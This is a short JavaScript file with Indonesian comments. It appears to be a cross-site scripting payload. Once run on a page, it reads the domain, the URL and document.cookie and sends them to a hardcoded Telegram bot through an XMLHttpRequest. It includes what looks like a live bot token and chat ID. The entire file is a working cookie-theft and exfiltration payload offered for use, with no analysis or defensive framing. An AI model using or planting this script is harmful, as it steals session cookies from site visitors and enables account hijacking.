function telegramSend() {
  var botToken = '8386178974:AAGBR5NWNvBEniWsA8SDRqb_4oPvni5nv9M'; // GANTI DENGAN TOKEN BOT ANDA
  var chatId = '6766861678';     // GANTI DENGAN ID CHAT ANDA
  
  // Membuat pesan dengan format HTML
  var message = 
    '<b>XSS Alert in ' + document.domain + '</b>\n' +
    '------------------------------------------------\n\n' +
    '<b>📌 URL Target</b>\n' +
    '<pre>' + document.location.href + '</pre>\n\n' +
    '<b>🍪 Document Cookie</b>\n' +
    '<pre>' + document.cookie + '</pre>';
  
  // Encode pesan untuk URL
  var encodedMessage = encodeURIComponent(message);
  
  // Mengirim ke Telegram API langsung
  var xhr = new XMLHttpRequest();      
  xhr.open('GET', 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodedMessage + '&parse_mode=HTML', true);      
  xhr.send();
}

telegramSend();
